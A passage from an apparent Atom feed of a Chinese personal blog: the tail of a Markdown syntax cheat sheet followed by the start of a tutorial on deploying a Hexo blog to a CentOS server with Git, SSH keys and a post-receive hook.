&#x52A0;&#x4E00;&#x4E2A;&#x7A7A;&#x683C;-&#x5217;&#x8868;&#x4E00;-&#x5217;&#x8868;&#x4E8C;-&#x5217;&#x8868;&#x4E09;</code></pre><a id="more"></a><p>&#x6709;&#x5E8F;&#x5217;&#x8868;&#x6548;&#x679C;</p><blockquote><ol><li>&#x5217;&#x8868;1</li><li>&#x5217;&#x8868;2</li><li>&#x7C7B;&#x8868;3</li></ol></blockquote><p>&#x65E0;&#x5E8F;&#x5217;&#x8868;&#x6548;&#x679C;</p><blockquote><ul><li>&#x5217;&#x8868;&#x4E00;</li><li>&#x5217;&#x8868;&#x4E8C;</li><li>&#x5217;&#x8868;&#x4E09;</li></ul></blockquote><hr><h5 id="&#x5F3A;&#x8C03;"><a href="#&#x5F3A;&#x8C03;" class="headerlink" title="&#x5F3A;&#x8C03;"></a>&#x5F3A;&#x8C03;</h5><pre><code>*&#x659C;&#x4F53;***&#x7C97;&#x4F53;**</code></pre><p><em>&#x659C;&#x4F53;</em><br><strong>&#x7C97;&#x4F53;</strong></p><hr><h5 id="&#x8D85;&#x94FE;&#x63A5;"><a href="#&#x8D85;&#x94FE;&#x63A5;" class="headerlink" title="&#x8D85;&#x94FE;&#x63A5;"></a>&#x8D85;&#x94FE;&#x63A5;</h5><pre><code>[&#x6211;&#x7684;&#x535A;&#x5BA2;](https://marnm.github.io/)</code></pre><p><a href="http://www.dsig.xyz/" target="_blank" rel="noopener">&#x6211;&#x7684;&#x535A;&#x5BA2;</a></p><hr><h5 id="&#x5F15;&#x7528;"><a href="#&#x5F15;&#x7528;" class="headerlink" title="&#x5F15;&#x7528;"></a>&#x5F15;&#x7528;</h5><pre><code>&gt; &#x8FD9;&#x662F;&#x5F15;&#x7528;&#x7684;&#x6587;&#x5B57;&gt; &#x5F15;&#x7528;&#x5185;&#x53EF;&#x4EE5;&#x5D4C;&#x5957;&#x6807;&#x9898;&#x3001;&#x6807;&#x9898;&#x5217;&#x8868;&#x7B49;&gt; ##### &#x6807;&#x9898;&gt; - &#x65E0;&#x5E8F;&#x5217;&#x8868;&gt; 1. &#x6709;&#x5E8F;&#x5217;&#x8868;</code></pre><blockquote><p>&#x8FD9;&#x662F;&#x5F15;&#x7528;&#x7684;&#x6587;&#x5B57;<br>&#x5F15;&#x7528;&#x5185;&#x53EF;&#x4EE5;&#x5D4C;&#x5957;&#x6807;&#x9898;&#x3001;&#x6807;&#x9898;&#x5217;&#x8868;&#x7B49;</p><h5 id="&#x6807;&#x9898;-1"><a href="#&#x6807;&#x9898;-1" class="headerlink" title="&#x6807;&#x9898;"></a>&#x6807;&#x9898;</h5><ul><li>&#x65E0;&#x5E8F;&#x5217;&#x8868;</li></ul><ol><li>&#x6709;&#x5E8F;&#x5217;&#x8868;</li></ol></blockquote><hr><h5 id="&#x4EE3;&#x7801;"><a href="#&#x4EE3;&#x7801;" class="headerlink" title="&#x4EE3;&#x7801;"></a>&#x4EE3;&#x7801;</h5><pre><code>public class HelloWorld {    public static void main(String[] args){        System.out.println(&quot;Hello World!&quot;);    }}</code></pre><hr><h5 id="&#x8868;&#x683C;"><a href="#&#x8868;&#x683C;" class="headerlink" title="&#x8868;&#x683C;"></a>&#x8868;&#x683C;</h5><pre><code>Item     | Value-------- | ---Computer | $1600Phone    | $12Pipe     | $1</code></pre><p>&#x6548;&#x679C;</p><table><thead><tr><th>Item</th><th>Value</th></tr></thead><tbody><tr><td>Computer</td><td>$1600</td></tr><tr><td>Phone</td><td>$12</td></tr><tr><td>Pipe</td><td>$1</td></tr></tbody></table><hr><h5 id="&#x63D2;&#x5165;&#x56FE;&#x50CF;"><a href="#&#x63D2;&#x5165;&#x56FE;&#x50CF;" class="headerlink" title="&#x63D2;&#x5165;&#x56FE;&#x50CF;"></a>&#x63D2;&#x5165;&#x56FE;&#x50CF;</h5><pre><code>![&#x63CF;&#x8FF0;](URL)![@&#x56FE;&#x7247;&#x5E95;&#x4E0B;&#x663E;&#x793A;&#x63CF;&#x8FF0; | center | 300x200](1.png)</code></pre><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oofx6tpf6.bkt.clouddn.com/hexo-cover.png" alt="@&#x63D2;&#x5165;&#x56FE;&#x7247; | right | 300x200" title="">                </div>                <div class="image-caption">@&#x63D2;&#x5165;&#x56FE;&#x7247; | right | 300x200</div>            </figure><h5 id="&#x952E;&#x76D8;&#x952E;"><a href="#&#x952E;&#x76D8;&#x952E;" class="headerlink" title="&#x952E;&#x76D8;&#x952E;"></a>&#x952E;&#x76D8;&#x952E;</h5><pre><code>&lt;kbd&gt;Ctrl+C&lt;/kbd&gt; and &lt;kbd&gt;Ctrl+V&lt;/kbd&gt;</code></pre><p><kbd>Ctrl+C</kbd> and <kbd>Ctrl+V</kbd></p><h5 id="&#x6807;&#x8BB0;"><a href="#&#x6807;&#x8BB0;" class="headerlink" title="&#x6807;&#x8BB0;"></a>&#x6807;&#x8BB0;</h5><pre><code>`&#x6807;&#x8BB0;`</code></pre><p><code>&#x6807;&#x8BB0;</code></p><center><code>Markdown</code> <code>&#x6807;&#x8BB0;&#x8BED;&#x8A00;</code></center><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Markdown语法&quot;&gt;&lt;a href=&quot;#Markdown语法&quot; class=&quot;headerlink&quot; title=&quot;Markdown语法&quot;&gt;&lt;/a&gt;Markdown语法&lt;/h2&gt;&lt;p&gt;简单说下一些Markdown的语法使用，这样就能更加熟悉的使用Markdown编写文章了。&lt;/p&gt;
&lt;h5 id=&quot;标题&quot;&gt;&lt;a href=&quot;#标题&quot; class=&quot;headerlink&quot; title=&quot;标题&quot;&gt;&lt;/a&gt;标题&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;# h1级标题
## h2级标题
### h3级标题
#### h4级标题
##### h5级标题
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h5 id=&quot;列表&quot;&gt;&lt;a href=&quot;#列表&quot; class=&quot;headerlink&quot; title=&quot;列表&quot;&gt;&lt;/a&gt;列表&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;#有序列表
1.列表1
2.列表2
3.列表3
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;pre&gt;&lt;code&gt;#无序列表:使用 - 加一个空格
-列表一
-列表二
-列表三
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="默认" scheme="https://marnm.github.io/categories/%E9%BB%98%E8%AE%A4/"/>
    
    
      <category term="标记语言" scheme="https://marnm.github.io/tags/%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>使用服务搭建Hexo个人博客</title>
    <link href="https://marnm.github.io//posts/b161a250/"/>
    <id>https://marnm.github.io//posts/b161a250/</id>
    <published>2018-07-03T15:22:24.000Z</published>
    <updated>2022-05-27T01:36:40.418Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x4F7F;&#x7528;&#x670D;&#x52A1;&#x5668;&#x642D;&#x5EFA;Hexo&#x4E2A;&#x4EBA;&#x535A;&#x5BA2;&#x8BE6;&#x7EC6;"><a href="#&#x4F7F;&#x7528;&#x670D;&#x52A1;&#x5668;&#x642D;&#x5EFA;Hexo&#x4E2A;&#x4EBA;&#x535A;&#x5BA2;&#x8BE6;&#x7EC6;" class="headerlink" title="&#x4F7F;&#x7528;&#x670D;&#x52A1;&#x5668;&#x642D;&#x5EFA;Hexo&#x4E2A;&#x4EBA;&#x535A;&#x5BA2;&#x8BE6;&#x7EC6;"></a>&#x4F7F;&#x7528;&#x670D;&#x52A1;&#x5668;&#x642D;&#x5EFA;Hexo&#x4E2A;&#x4EBA;&#x535A;&#x5BA2;<code>&#x8BE6;&#x7EC6;</code></h2><p>&#x5728;&#x5B66;&#x4E60;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x88AB;&#x52A8;&#x63A5;&#x53D7;&#x77E5;&#x8BC6;&#x5BF9;&#x4F60;&#x7684;&#x63D0;&#x9AD8;&#x662F;&#x8F7B;&#x5FAE;&#x7684;&#xFF1B;<br>&#x53EA;&#x6709;&#x4E3B;&#x52A8;&#x5B66;&#x4E60;&#xFF0C;&#x4E3B;&#x52A8;&#x601D;&#x8003;&#xFF0C;&#x624D;&#x80FD;&#x5B66;&#x4E60;&#x7684;&#x900F;&#x5F7B;&#xFF0C;&#x81F3;&#x5C11;&#x662F;&#x9AD8;&#x4E8E;&#x88AB;&#x52A8;&#x5B66;&#x4E60;&#x5427;&#x3002;<br>&#x642D;&#x5EFA;&#x4E2A;&#x4EBA;&#x535A;&#x5BA2;&#xFF0C;&#x6700;&#x5927;&#x5316;&#x7684;&#x5229;&#x7528;&#x4F60;&#x6240;&#x5B66;&#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x68C0;&#x9A8C;&#x662F;&#x5426;&#x5B66;&#x4E60;&#x7684;&#x900F;&#x5F7B;&#x3002;</p><a id="more"></a><hr><h2 id="&#x5F00;&#x59CB;&#x642D;&#x5EFA;&#x4E2A;&#x4EBA;&#x535A;&#x5BA2;"><a href="#&#x5F00;&#x59CB;&#x642D;&#x5EFA;&#x4E2A;&#x4EBA;&#x535A;&#x5BA2;" class="headerlink" title="&#x5F00;&#x59CB;&#x642D;&#x5EFA;&#x4E2A;&#x4EBA;&#x535A;&#x5BA2;"></a>&#x5F00;&#x59CB;&#x642D;&#x5EFA;&#x4E2A;&#x4EBA;&#x535A;&#x5BA2;</h2><p>&#x8FD9;&#x91CC;&#x6211;&#x4F7F;&#x7528;&#x7684;&#x914D;&#x7F6E;&#x662F;&#x672C;&#x5730;&#x673A;&#x5668;<code>Win 10_x64</code>&#x548C;<a href="https://cloud.tencent.com/" target="_blank" rel="noopener">&#x817E;&#x8BAF;&#x4E91;&#x670D;&#x52A1;&#x5668;</a><code>CentOS 6.5_x64</code></p><blockquote><h4 id="&#x914D;&#x7F6E;&#x672C;&#x5730;&#x73AF;&#x5883;"><a href="#&#x914D;&#x7F6E;&#x672C;&#x5730;&#x73AF;&#x5883;" class="headerlink" title="&#x914D;&#x7F6E;&#x672C;&#x5730;&#x73AF;&#x5883;"></a>&#x914D;&#x7F6E;&#x672C;&#x5730;&#x73AF;&#x5883;</h4><p>&#x5B89;&#x88C5;<a href="https://nodejs.org/zh-cn/" target="_blank" rel="noopener">Node.js</a>&#x548C;<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">Git</a>&#xFF0C;&#x5B89;&#x88C5;&#x65F6;&#x9ED8;&#x8BA4;&#x4E00;&#x76F4;&#x4E0B;&#x4E00;&#x6B65;&#x5C31;&#x597D;&#x3002;</p></blockquote><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://wx2.sinaimg.cn/mw690/006ALkzYly1fsz677sd2lj30m009hgll.jpg" alt="@Node.js | left |" title="">                </div>                <div class="image-caption">@Node.js | left |</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://ww1.sinaimg.cn/mw690/006ALkzYgy1fsz8ihdz6vj31190p8tb9.jpg" alt="@Git | left |" title="">                </div>                <div class="image-caption">@Git | left |</div>            </figure><blockquote><h5 id="&#x8BBE;&#x7F6E;Git&#x7528;&#x6237;&#x540D;&#x548C;&#x90AE;&#x7BB1;"><a href="#&#x8BBE;&#x7F6E;Git&#x7528;&#x6237;&#x540D;&#x548C;&#x90AE;&#x7BB1;" class="headerlink" title="&#x8BBE;&#x7F6E;Git&#x7528;&#x6237;&#x540D;&#x548C;&#x90AE;&#x7BB1;"></a>&#x8BBE;&#x7F6E;Git&#x7528;&#x6237;&#x540D;&#x548C;&#x90AE;&#x7BB1;</h5><p>git config &#x2013;list</p></blockquote><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://ww1.sinaimg.cn/mw690/006ALkzYgy1fsz8q34u5ej30o00eet9j.jpg" alt="@git config --list | left |" title="">                </div>                <div class="image-caption">@git config --list | left |</div>            </figure><blockquote><p>git config &#x2013;global user.name &#x201C;&#x7528;&#x6237;&#x540D;&#x201D;<br>git config &#x2013;global user.email &#x201C;&#x90AE;&#x7BB1;&#x5730;&#x5740;&#x201D;<br>&#x6216;&#x4FEE;&#x6539;&#x7528;&#x6237;&#x540D;&#x548C;&#x90AE;&#x7BB1;<br>git config &#x2013;global &#x2013;replace-all user.name &#x201C;&#x7528;&#x6237;&#x540D;&#x201D;<br>git config &#x2013;global &#x2013;replace-all user.email &#x201C;&#x90AE;&#x7BB1;&#x5730;&#x5740;&#x201D;</p></blockquote><blockquote><h5 id="&#x5B89;&#x88C5;Hexo"><a href="#&#x5B89;&#x88C5;Hexo" class="headerlink" title="&#x5B89;&#x88C5;Hexo"></a>&#x5B89;&#x88C5;Hexo</h5><p>npm install -g hexo-cli</p></blockquote><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://ww1.sinaimg.cn/mw690/006ALkzYgy1fsz9zdarehj30n30d33zc.jpg" alt="@Hexo" title="">                </div>                <div class="image-caption">@Hexo</div>            </figure><blockquote><h5 id="&#x914D;&#x7F6E;Hexo&#x7AD9;&#x70B9;&#x76EE;&#x5F55;"><a href="#&#x914D;&#x7F6E;Hexo&#x7AD9;&#x70B9;&#x76EE;&#x5F55;" class="headerlink" title="&#x914D;&#x7F6E;Hexo&#x7AD9;&#x70B9;&#x76EE;&#x5F55;"></a>&#x914D;&#x7F6E;Hexo&#x7AD9;&#x70B9;&#x76EE;&#x5F55;</h5><p>mkdir blog        // &#x521B;&#x5EFA;&#x5B58;&#x653E;Hexo&#x7AD9;&#x70B9;&#x7684;&#x6587;&#x4EF6;&#x5939;<br>hexo init blog    // &#x751F;&#x6210;Hexo&#x7AD9;&#x70B9;<br>hexo s &#x2013;debug    // &#x7AD9;&#x70B9;&#x6D4B;&#x8BD5;, &#x5728;&#x6D4F;&#x89C8;&#x5668;&#x4E2D;&#x6253;&#x5F00;<a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a></p></blockquote><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://ww1.sinaimg.cn/mw690/006ALkzYgy1fsza7t8cgsj30u00imabv.jpg" alt="@&#x751F;&#x6210;hexo&#x7AD9;&#x70B9;" title="">                </div>                <div class="image-caption">@&#x751F;&#x6210;hexo&#x7AD9;&#x70B9;</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://www.illgo.cn/blog/introduceHexo/debug3.png" alt="@&#x542F;&#x52A8;hexo" title="">                </div>                <div class="image-caption">@&#x542F;&#x52A8;hexo</div>            </figure><blockquote><h5 id="&#x751F;&#x6210;SSH&#x5BC6;&#x94A5;"><a href="#&#x751F;&#x6210;SSH&#x5BC6;&#x94A5;" class="headerlink" title="&#x751F;&#x6210;SSH&#x5BC6;&#x94A5;"></a>&#x751F;&#x6210;SSH&#x5BC6;&#x94A5;</h5><p>&#x5728;&#x672C;&#x5730;&#x751F;&#x6210;&#x4E00;&#x5BF9;SSH&#x5BC6;&#x94A5;&#xFF0C;&#x7528;&#x4E8E;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x8FDE;&#x63A5;<br>ssh-keygen -t rsa -C &#x201C;<a href="mailto:echo@qq.com" target="_blank" rel="noopener">echo@qq.com</a>&#x201C;</p><blockquote><p>#&#x7B2C;&#x4E00;&#x4E2A;&#x63D0;&#x793A;&#x8F93;&#x5165;&#x4FDD;&#x5B58;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;&#x7A7A;&#xFF0C;&#x56DE;&#x8F66;&#x3002;</p><p>#&#x7B2C;&#x4E8C;&#x4E2A;&#x63D0;&#x793A;&#x8F93;&#x5165;&#x5BC6;&#x94A5;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;&#x7A7A;&#xFF0C;&#x56DE;&#x8F66;    </p><p>#&#x7B2C;&#x4E09;&#x4E2A;&#x786E;&#x8BA4;&#x521A;&#x8F93;&#x5165;&#x5BC6;&#x94A5;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;&#x7A7A;&#xFF0C;&#x56DE;&#x8F66;</p></blockquote></blockquote><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://ww1.sinaimg.cn/mw690/006ALkzYgy1fszai87g5bj30kp0ch74g.jpg" alt="@&#x751F;&#x6210;&#x5BC6;&#x94A5;" title="">                </div>                <div class="image-caption">@&#x751F;&#x6210;&#x5BC6;&#x94A5;</div>            </figure><blockquote><h4 id="&#x914D;&#x7F6E;&#x670D;&#x52A1;&#x5668;&#x73AF;&#x5883;"><a href="#&#x914D;&#x7F6E;&#x670D;&#x52A1;&#x5668;&#x73AF;&#x5883;" class="headerlink" title="&#x914D;&#x7F6E;&#x670D;&#x52A1;&#x5668;&#x73AF;&#x5883;"></a>&#x914D;&#x7F6E;&#x670D;&#x52A1;&#x5668;&#x73AF;&#x5883;</h4><h5 id="&#x5B89;&#x88C5;Node-js"><a href="#&#x5B89;&#x88C5;Node-js" class="headerlink" title="&#x5B89;&#x88C5;Node.js"></a>&#x5B89;&#x88C5;<a href="https://nodejs.org/zh-cn/" target="_blank" rel="noopener">Node.js</a></h5><p>#yum install -y nodejs</p></blockquote><blockquote><h5 id="&#x5B89;&#x88C5;Git"><a href="#&#x5B89;&#x88C5;Git" class="headerlink" title="&#x5B89;&#x88C5;Git"></a>&#x5B89;&#x88C5;<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">Git</a></h5><p>&#x7531;&#x4E8E;Redhat Linux&#xFF0C;Oracle Linux&#xFF0C;CentOS&#xFF0C;Scientific Linux&#x7B49;yum&#x5E93;&#x7684;Git&#x7248;&#x672C;&#x592A;&#x4F4E;&#xFF0C;&#x8FD9;&#x91CC;&#x4E0D;&#x63A8;&#x8350;&#x4F7F;&#x7528;&#xFF0C;&#x6211;&#x4EEC;&#x76F4;&#x63A5;&#x53BB;&#x4E0B;&#x8F7D;&#x6700;&#x65B0;&#x7248;&#x6E90;&#x7801;&#x5305;&#x7F16;&#x8BD1;&#x5B89;&#x8F6C;&#x3002;<br>RHEL&#x548C;&#x884D;&#x751F;&#x4EA7;&#x54C1;&#x901A;&#x5E38;&#x90FD;&#x4F1A;&#x53D1;&#x5E03;&#x65E7;&#x7248;&#x672C;&#x7684;git&#x3002;&#x60A8;&#x53EF;&#x4EE5;&#x4ECE;&#x6E90;&#x4EE3;&#x7801;&#x4E0B;&#x8F7D;<a href="https://mirrors.edge.kernel.org/pub/software/scm/git/" target="_blank" rel="noopener">tarball</a>&#x548C;&#x6784;&#x5EFA;&#xFF0C;&#x6216;&#x4F7F;&#x7528;&#x7B2C;&#x4E09;&#x65B9;&#x5B58;&#x50A8;&#x5E93;&#xFF08;<a href="https://ius.io/" target="_blank" rel="noopener">&#x5982;IUS&#x793E;&#x533A;&#x9879;&#x76EE;</a>&#xFF09;&#x6765;&#x83B7;&#x53D6;&#x66F4;&#x65B0;&#x7248;&#x672C;&#x7684;git&#x3002;</p></blockquote><blockquote><p><strong>&#x9996;&#x5148;&#x5B89;&#x8F6C;Git&#x4F9D;&#x8D56;&#x5305;</strong></p><p>#yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel</p><p>#yum install gcc perl-ExtUtils-MakeMaker</p><p>#yum remove git     // &#x5982;&#x679C;&#x4E4B;&#x524D;&#x6709;&#x5B89;&#x8F6C;&#x65E7;&#x7248;&#x672C;Git&#x5148;&#x5378;&#x8F7D;</p></blockquote><blockquote><p><strong>&#x4E0B;&#x8F7D;&#x89E3;&#x538B;Git&#x6E90;&#x7801;&#x5305;</strong><br>mkdir /usr/local/git<br>cd /usr/local/git<br>wget <a href="https://mirrors.edge.kernel.org/pub/software/scm/git/git-2.9.5.tar.gz" target="_blank" rel="noopener">https://mirrors.edge.kernel.org/pub/software/scm/git/git-2.9.5.tar.gz</a><br>tar -zxvf git-2.9.5.tar.gz</p></blockquote><blockquote><p><strong>&#x7F16;&#x8BD1;&#x5B89;&#x88C5;</strong><br>cd git-2.9.5<br>make prefix=/usr/local/git all<br>make prefix=/usr/local/git install<br>echo &#x201C;export PATH=$PATH:/usr/local/git/bin&#x201D; &gt;&gt; /etc/bashrc    //#&#x6DFB;&#x52A0;&#x73AF;&#x5883;&#x53D8;&#x91CF;<br>source /etc/bashrc    ##&#x4F7F;&#x914D;&#x7F6E;&#x7ACB;&#x5373;&#x751F;&#x6548;</p></blockquote><blockquote><p><strong>&#x8BBE;&#x7F6E;Git&#x9ED8;&#x8BA4;&#x8DEF;&#x5F84;</strong></p><p>#ln -s /usr/local/git/bin/git-upload-pack /usr/bin/git-upload-pack</p><p>#ln -s /usr/local/git/bin/git-receive-pack /usr/bin/git-receive-pack</p></blockquote><blockquote><p><strong>&#x521B;&#x5EFA;git&#x7528;&#x6237;&#x7EC4;&#x548C;&#x7528;&#x6237;,&#x7528;&#x6765;&#x8FD0;&#x884C;Git&#x670D;&#x52A1;</strong></p><p>#groupadd git</p><p>   #useradd git -g git</p><p>   #passwd git<br>   &#x5207;&#x6362;&#x5230;git&#x7528;&#x6237;</p><p>   #su - git</p></blockquote><blockquote><p><strong>&#x8BBE;&#x7F6E;&#x7528;&#x6237;&#x6743;&#x9650;</strong></p><p>##git&#x7528;&#x6237;&#x76EE;&#x5F55;&#x4E0B;:</p><p>#mkdir .ssh     ##&#x65B0;&#x5EFA;&#x6587;&#x4EF6;&#x5939;</p><p>#chmod 700 .ssh</p><p>#touch .ssh/authorized_keys     ##&#x65B0;&#x5EFA;&#x6587;&#x4EF6;</p><p>#chmod 600 .ssh/authorized_keys<br>cd /home<br>chown -R git:git git&#x8BBE;&#x7F6E;git&#x6587;&#x4EF6;&#x5939;&#x6240;&#x6709;&#x8005;&#xFF0C;&#x53BB;&#x9664;&#x65E0;&#x5173;&#x7528;&#x6237;&#x7684;&#x6743;&#x9650;</p></blockquote><blockquote><p><strong>&#x4FEE;&#x8EAB;ssh&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5F00;&#x542F;RSA&#x8BA4;&#x8BC1;</strong></p><p>#vi /etc/ssh/sshd_config</p></blockquote><pre><code>#&#x627E;&#x5230;&#x5982;&#x4E0B;&#x4E09;&#x4E2A;&#x9009;&#x7EBF;&#xFF0C;&#x4FEE;&#x6539;1.RSAAuthentication yes2.PubkeyAuthentication yes3.AuthorizedKeysFile home/git/.ssh/authorized_keys</code></pre><blockquote><p>&#x4FDD;&#x5B58;:wq<br>&#x56DE;&#x5230;&#x672C;&#x5730;&#x673A;&#x5668;&#xFF0C;&#x5C06;&#x521A;&#x624D;&#x751F;&#x6210;&#x7684;SSH&#x5BC6;&#x94A5;&#x5BFC;&#x51FA;&#x4E0A;&#x4F20;&#x5230;&#x670D;&#x52A1;&#x5668;</p></blockquote><blockquote><p>scp .ssh/id_rsa.pub <a href="mailto:root@192.168.1.2" target="_blank" rel="noopener">root@192.168.1.2</a>:/home/git/.ssh/authorized_keys<br>&#x6211;&#x7684;win10&#x7CFB;&#x7EDF;&#x662F;&#x81EA;&#x5E26;&#x6709;scp&#x547D;&#x4EE4;&#x7684;&#xFF0C;win7&#x53EF;&#x80FD;&#x6CA1;&#x6709;&#xFF0C;&#x53EF;&#x4EE5;&#x6253;&#x5F00;git bash&#x547D;&#x4EE4;&#x884C;&#xFF0C;git&#x5DE5;&#x5177;&#x6709;&#xFF0C;&#x6216;&#x8005;&#x5B89;&#x88C5;putty&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;pscp</p></blockquote><hr><h2 id="&#x90E8;&#x7F72;hexo&#x535A;&#x5BA2;"><a href="#&#x90E8;&#x7F72;hexo&#x535A;&#x5BA2;" class="headerlink" title="&#x90E8;&#x7F72;hexo&#x535A;&#x5BA2;"></a>&#x90E8;&#x7F72;hexo&#x535A;&#x5BA2;</h2><blockquote><h4 id="&#x521D;&#x59CB;&#x5316;git&#x4ED3;&#x5E93;"><a href="#&#x521D;&#x59CB;&#x5316;git&#x4ED3;&#x5E93;" class="headerlink" title="&#x521D;&#x59CB;&#x5316;git&#x4ED3;&#x5E93;"></a>&#x521D;&#x59CB;&#x5316;git&#x4ED3;&#x5E93;</h4><p>#cd /home/git</p><p>#git init &#x2013;bare blog.git</p><p>#chown -R git:git blog.git     ##&#x6BCF;&#x751F;&#x6210;&#x4E00;&#x4E2A;git&#x4ED3;&#x5E93;&#x90FD;&#x8981;&#x4FEE;&#x6539;&#x7528;&#x6237;&#x6743;&#x9650;</p></blockquote><blockquote><h5 id="&#x514B;&#x9686;&#x4ED3;&#x5E93;&#x5230;&#x672C;&#x5730;&#xFF0C;&#x6D4B;&#x8BD5;&#x672C;&#x5730;&#x673A;&#x5668;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FDE;&#x901A;"><a href="#&#x514B;&#x9686;&#x4ED3;&#x5E93;&#x5230;&#x672C;&#x5730;&#xFF0C;&#x6D4B;&#x8BD5;&#x672C;&#x5730;&#x673A;&#x5668;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FDE;&#x901A;" class="headerlink" title="&#x514B;&#x9686;&#x4ED3;&#x5E93;&#x5230;&#x672C;&#x5730;&#xFF0C;&#x6D4B;&#x8BD5;&#x672C;&#x5730;&#x673A;&#x5668;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FDE;&#x901A;"></a>&#x514B;&#x9686;&#x4ED3;&#x5E93;&#x5230;&#x672C;&#x5730;&#xFF0C;&#x6D4B;&#x8BD5;&#x672C;&#x5730;&#x673A;&#x5668;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FDE;&#x901A;</h5><p>git clone git@your-ip:/home/git/blog.git</p><blockquote><p>&#x2026;<br>warning: You appear to have cloned an empty repository.<br>&#x2026;</p></blockquote></blockquote><blockquote><h4 id="&#x5728;web&#x76EE;&#x5F55;&#x4E0B;clone"><a href="#&#x5728;web&#x76EE;&#x5F55;&#x4E0B;clone" class="headerlink" title="&#x5728;web&#x76EE;&#x5F55;&#x4E0B;clone"></a>&#x5728;web&#x76EE;&#x5F55;&#x4E0B;clone</h4><p>&#x8FD9;&#x91CC;&#x6211;&#x76F4;&#x63A5;&#x4F7F;&#x7528;Apache&#x7684;&#x9ED8;&#x8BA4;&#x8DEF;&#x5F84;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#x4E3A;&#x522B;&#x7684;&#x76EE;&#x5F55;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;mkdir /var/www/hexo-blog</p></blockquote><blockquote><p>git clone /home/git/blog.gig /var/www/html<br>chown -R git:git /var/www/html</p></blockquote><blockquote><h4 id="&#x8BBE;&#x7F6E;Git-Hook"><a href="#&#x8BBE;&#x7F6E;Git-Hook" class="headerlink" title="&#x8BBE;&#x7F6E;Git Hook"></a>&#x8BBE;&#x7F6E;Git Hook</h4><p>&#x4F7F;&#x7528;Git Hook&#x628A;Hexo&#x751F;&#x6210;&#x7684;&#x9759;&#x6001;web&#x8D44;&#x6E90;&#x81EA;&#x52A8;&#x90E8;&#x7F72;&#x5230;web&#x76EE;&#x5F55;&#x4E0B;<br>vim /home/git/hooks/post-receive<br>&#x5728;DeployPath=&#x201D;&#x201D;&#x4E2D;&#x586B;&#x5165;&#x4F60;&#x7684;web&#x76EE;&#x5F55;</p></blockquote><pre><code>#!/bin/bash#author: @illgo#author blog: http://www.illgo.cn/#&#x5224;&#x65AD;&#x662F;&#x4E0D;&#x662F;&#x8FDC;&#x7AEF;&#x4ED3;&#x5E93;IS_BARE=$(git rev-parse --is-bare-repository)if [ -z &quot;$IS_BARE&quot; ]; thenecho &gt;&amp;2 &quot;fatal: post-receive: IS_NOT_BARE&quot;exit 1fiunset GIT_DIRDeployPath=&quot;/var/www/html/&quot;echo &quot;===============================================&quot;cd $DeployPathecho &quot;deploying the myblog web&quot;#git stash#git pull origin mastergit fetch --allgit reset --hard origin/mastertime=`date`echo &quot;web server pull at webserver at time: $time.&quot;echo &quot;================================================&quot;</code></pre><blockquote><h4 id="&#x914D;&#x7F6E;Git&#x90E8;&#x7F72;"><a href="#&#x914D;&#x7F6E;Git&#x90E8;&#x7F72;" class="headerlink" title="&#x914D;&#x7F6E;Git&#x90E8;&#x7F72;"></a>&#x914D;&#x7F6E;Git&#x90E8;&#x7F72;</h4><p>&#x56DE;&#x5230;&#x672C;&#x5730;&#xFF0C;&#x5207;&#x6362;&#x5230;&#x4F60;&#x751F;&#x6210;&#x7684;hexo&#x7AD9;&#x70B9;&#x76EE;&#x5F55;<br>cd blog<br>npm install hexo-deployer-git<br>&#x5B89;&#x88C5;hexo&#x7684;Git&#x90E8;&#x7F72;&#x4F9D;&#x8D56;&#x5305;</p></blockquote><h4 id="&#x4FEE;&#x6539;hexo&#x7AD9;&#x70B9;&#x914D;&#x7F6E;&#x6587;&#x4EF6;-config-yml-&#x62C9;&#x5230;&#x6700;&#x5E95;&#x90E8;"><a 